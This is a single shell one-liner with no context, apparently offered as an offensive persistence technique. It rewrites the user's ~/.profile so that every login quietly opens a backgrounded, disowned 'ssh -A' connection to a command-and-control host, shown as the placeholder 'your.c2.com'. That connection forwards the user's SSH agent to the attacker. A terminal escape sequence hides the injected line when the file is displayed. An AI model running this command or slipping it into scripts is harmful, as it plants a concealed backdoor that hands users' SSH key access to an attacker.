SERVER="your.c2.com" cat <(echo "ssh -A ssh@$SERVER >/dev/null 2>&1 & disown #\033[2K\r") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
